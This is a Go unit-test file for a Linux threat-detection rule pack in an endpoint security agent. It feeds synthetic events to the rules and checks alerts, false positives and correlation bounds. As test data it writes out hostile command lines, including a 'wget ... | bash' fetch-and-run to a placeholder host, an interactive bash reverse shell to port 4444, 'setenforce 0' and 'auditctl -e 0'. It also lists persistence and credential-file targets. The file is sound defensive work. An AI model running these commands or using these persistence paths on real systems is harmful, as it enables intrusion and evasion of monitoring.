package detection

import (
	"fmt"
	"testing"
	"time"

	"github.com/paddman/NTAgentShieldWindows/internal/model"
)

func TestLinuxDetectionPackCoversRequiredSignals(t *testing.T) {
	cases := []struct {
		name  string
		event model.Event
		rule  string
	}{
		{"web shell", model.Event{Kind: "process.exec", Process: model.ProcessContext{ParentImage: "/usr/sbin/nginx", Image: "/bin/sh"}}, "NTS-LNX-001"},
		{"remote pipe", model.Event{Kind: "process.exec", Process: model.ProcessContext{Image: "/bin/bash", CommandLine: "wget -qO- https://example.invalid/a | bash"}}, "NTS-LNX-002"},
		{"temporary execution", model.Event{Kind: "process.exec", Process: model.ProcessContext{Image: "/dev/shm/payload"}}, "NTS-LNX-003"},
		{"systemd persistence", fileEvent("file.write", "/etc/systemd/system/update.service"), "NTS-LNX-004"},
		{"cron persistence", fileEvent("file.rename", "/etc/cron.d/backup"), "NTS-LNX-005"},
		{"authorized keys", fileEvent("file.write", "/root/.ssh/authorized_keys"), "NTS-LNX-006"},
		{"sudoers", fileEvent("file.write", "/etc/sudoers.d/support"), "NTS-LNX-007"},
		{"pam", fileEvent("file.write", "/etc/pam.d/sshd"), "NTS-LNX-008"},
		{"preload", fileEvent("file.write", "/etc/ld.so.preload"), "NTS-LNX-009"},
		{"selinux disable", model.Event{Kind: "process.exec", Process: model.ProcessContext{Image: "/usr/sbin/setenforce", CommandLine: "setenforce 0"}}, "NTS-LNX-010"},
		{"security log deletion", fileEvent("file.unlink", "/var/log/audit/audit.log"), "NTS-LNX-011"},
		{"module from tmp", model.Event{Kind: "kernel.module_load", File: model.FileContext{Path: "/tmp/driver.ko"}, Process: model.ProcessContext{Image: "/tmp/loader"}}, "NTS-LNX-012"},
		{"shadow access", fileEvent("file.open", "/etc/shadow"), "NTS-LNX-013"},
		{"namespace escape", model.Event{Kind: "process.namespace_change", Process: model.ProcessContext{ContainerID: "container-a"}}, "NTS-LNX-014"},
		{"agent tamper", fileEvent("file.unlink", "/etc/ntagentshield/policy.json"), "NTS-LNX-015"},
		{"account create", model.Event{Kind: "identity.account_create", Message: "ADD_USER acct=backdoor"}, "NTS-LNX-016"},
		{"audit disable", model.Event{Kind: "security.audit_config", Message: "auditctl -e 0"}, "NTS-LNX-017"},
		{"reverse shell", model.Event{Kind: "network.connect", Network: model.NetworkContext{DestinationIP: "198.51.100.10", DestinationPort: 4444}, Process: model.ProcessContext{Image: "/bin/bash", CommandLine: "bash -i"}}, "NTS-LNX-018"},
	}
	pack := linuxDetectionPack{}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			testCase.event.Prepare()
			finding, found := findingByRule(pack.Evaluate(testCase.event), testCase.rule)
			if !found {
				t.Fatalf("missing %s for %#v", testCase.rule, testCase.event)
			}
			assertCompleteLinuxFinding(t, finding)
		})
	}
}

func TestLinuxDetectionPackRejectsBenignLookalikes(t *testing.T) {
	cases := []model.Event{
		{Kind: "file.open", File: model.FileContext{Path: "/etc/systemd/system/ssh.service"}},
		{Kind: "file.open", File: model.FileContext{Path: "/var/log/auth.log"}},
		{Kind: "kernel.module_load", File: model.FileContext{Path: "/lib/modules/6.8/kernel/net/bridge.ko"}, Process: model.ProcessContext{Image: "/usr/sbin/modprobe"}},
		{Kind: "log.observation", Message: "ntagentshield service is healthy"},
		{Kind: "security.audit_config", Message: "op=remove_rule key=temporary-maintenance"},
	}
	pack := linuxDetectionPack{}
	for index := range cases {
		cases[index].Prepare()
		if findings := pack.Evaluate(cases[index]); len(findings) != 0 {
			t.Fatalf("benign event %d produced findings: %#v", index, findings)
		}
	}
}

func TestLinuxCorrelationDetectsDropThenExecution(t *testing.T) {
	rule := newLinuxCorrelationRule()
	base := time.Date(2026, 8, 16, 1, 0, 0, 0, time.UTC)
	drop := fileEvent("file.write", "/tmp/payload")
	drop.ID = "evt-drop"
	drop.Timestamp = base
	drop.Process = model.ProcessContext{PID: 100, StartTimeTicks: 10, ProcessGUID: "proc-writer", Image: "/usr/bin/curl"}
	if findings := rule.Evaluate(drop); len(findings) != 0 {
		t.Fatalf("drop alone produced finding: %#v", findings)
	}
	exec := model.Event{ID: "evt-exec", Timestamp: base.Add(time.Second), Kind: "process.exec", Process: model.ProcessContext{PID: 101, StartTimeTicks: 11, ProcessGUID: "proc-payload", Image: "/tmp/payload"}}
	finding, found := findingByRule(rule.Evaluate(exec), "NTS-LNX-019")
	if !found {
		t.Fatal("missing drop-followed-by-execution finding")
	}
	assertCompleteLinuxFinding(t, finding)
	if len(finding.EvidenceEventIDs) != 2 || len(finding.ProcessTree) != 2 {
		t.Fatalf("correlation context incomplete: %#v", finding)
	}
}

func TestLinuxCorrelationExpiresOldDrops(t *testing.T) {
	rule := newLinuxCorrelationRule()
	base := time.Date(2026, 8, 16, 1, 0, 0, 0, time.UTC)
	drop := fileEvent("file.write", "/tmp/old")
	drop.ID, drop.Timestamp = "evt-old-drop", base
	rule.Evaluate(drop)
	exec := model.Event{ID: "evt-late-exec", Timestamp: base.Add(linuxDropTTL + time.Second), Kind: "process.exec", Process: model.ProcessContext{Image: "/tmp/old"}}
	if _, found := findingByRule(rule.Evaluate(exec), "NTS-LNX-019"); found {
		t.Fatal("expired drop produced a finding")
	}
}

func TestLinuxCorrelationDetectsBoundedMassModification(t *testing.T) {
	rule := newLinuxCorrelationRule()
	base := time.Date(2026, 8, 16, 1, 0, 0, 0, time.UTC)
	process := model.ProcessContext{PID: 700, StartTimeTicks: 77, ProcessGUID: "proc-ransom", Image: "/tmp/encryptor"}
	var findings []model.Finding
	for index := 0; index < linuxMassChangeThreshold; index++ {
		event := fileEvent("file.write", fmt.Sprintf("/srv/data/%03d.dat", index))
		event.ID = fmt.Sprintf("evt-%03d", index)
		event.Timestamp = base.Add(time.Duration(index) * time.Millisecond)
		event.Process = process
		findings = append(findings, rule.Evaluate(event)...)
	}
	finding, found := findingByRule(findings, "NTS-LNX-020")
	if !found {
		t.Fatal("missing mass modification finding")
	}
	assertCompleteLinuxFinding(t, finding)
	if finding.Attributes["distinct_path_count"] != linuxMassChangeThreshold {
		t.Fatalf("unexpected path count: %#v", finding.Attributes)
	}
	if len(rule.drops) > linuxMaxRecentDrops || len(rule.changes) > linuxMaxChangeProcesses || len(rule.changes["proc-ransom"].paths) > linuxMaxPathsPerProcess {
		t.Fatal("correlation state exceeded a configured bound")
	}
}

func TestLinuxCorrelationDeterministicEviction(t *testing.T) {
	rule := newLinuxCorrelationRule()
	base := time.Date(2026, 8, 16, 1, 0, 0, 0, time.UTC)
	for index := 0; index <= linuxMaxRecentDrops; index++ {
		event := fileEvent("file.write", fmt.Sprintf("/tmp/%04d", index))
		event.ID = fmt.Sprintf("evt-%04d", index)
		event.Timestamp = base
		rule.Evaluate(event)
	}
	if len(rule.drops) != linuxMaxRecentDrops {
		t.Fatalf("drop bound: got %d want %d", len(rule.drops), linuxMaxRecentDrops)
	}
	if _, exists := rule.drops["/tmp/0000"]; exists {
		t.Fatal("lexically first equal-time entry was not evicted")
	}
}

func TestLinuxCorrelationBoundsProcessesAndPaths(t *testing.T) {
	rule := newLinuxCorrelationRule()
	base := time.Date(2026, 8, 16, 1, 0, 0, 0, time.UTC)
	for processIndex := 0; processIndex <= linuxMaxChangeProcesses; processIndex++ {
		event := fileEvent("file.write", fmt.Sprintf("/srv/process-%04d/one", processIndex))
		event.ID = fmt.Sprintf("evt-process-%04d", processIndex)
		event.Timestamp = base
		event.Process.ProcessGUID = fmt.Sprintf("proc-%04d", processIndex)
		rule.Evaluate(event)
	}
	if len(rule.changes) != linuxMaxChangeProcesses {
		t.Fatalf("process bound: got %d want %d", len(rule.changes), linuxMaxChangeProcesses)
	}
	if _, exists := rule.changes["proc-0000"]; exists {
		t.Fatal("lexically first equal-time process entry was not evicted")
	}

	process := model.ProcessContext{PID: 900, StartTimeTicks: 90, ProcessGUID: "proc-path-bound"}
	for pathIndex := 0; pathIndex <= linuxMaxPathsPerProcess; pathIndex++ {
		event := fileEvent("file.write", fmt.Sprintf("/srv/bounded/%04d", pathIndex))
		event.ID = fmt.Sprintf("evt-path-%04d", pathIndex)
		event.Timestamp = base.Add(time.Second)
		event.Process = process
		rule.Evaluate(event)
	}
	if got := len(rule.changes[process.ProcessGUID].paths); got != linuxMaxPathsPerProcess {
		t.Fatalf("path bound: got %d want %d", got, linuxMaxPathsPerProcess)
	}
	if _, exists := rule.changes[process.ProcessGUID].paths["/srv/bounded/0000"]; exists {
		t.Fatal("lexically first equal-time path entry was not evicted")
	}
}

func TestLinuxPackWorksThroughOfflineEngine(t *testing.T) {
	engine := New()
	event := fileEvent("file.write", "/etc/ld.so.preload")
	event.Prepare()
	if _, found := findingByRule(engine.Inspect(event), "NTS-LNX-009"); !found {
		t.Fatal("offline engine did not execute Linux pack")
	}
}

func fileEvent(kind, path string) model.Event {
	return model.Event{Kind: kind, File: model.FileContext{Path: path, Operation: "modify"}, Process: model.ProcessContext{PID: 42, StartTimeTicks: 1, ProcessGUID: "proc-test", Image: "/usr/bin/editor"}}
}

func findingByRule(findings []model.Finding, ruleID string) (model.Finding, bool) {
	for _, finding := range findings {
		if finding.RuleID == ruleID {
			return finding, true
		}
	}
	return model.Finding{}, false
}

func assertCompleteLinuxFinding(t *testing.T, finding model.Finding) {
	t.Helper()
	if finding.RuleID == "" || finding.Title == "" || finding.TitleTH == "" || finding.Description == "" || finding.DescriptionTH == "" || finding.Severity == "" || finding.Confidence == 0 || finding.RecommendedResponse == "" {
		t.Fatalf("finding metadata incomplete: %#v", finding)
	}
	if len(finding.EvidenceEventIDs) == 0 || len(finding.ProcessTree) == 0 || len(finding.MITRETactics) == 0 || len(finding.MITRETechniques) == 0 || len(finding.RecommendedSteps) == 0 {
		t.Fatalf("finding context incomplete: %#v", finding)
	}
}
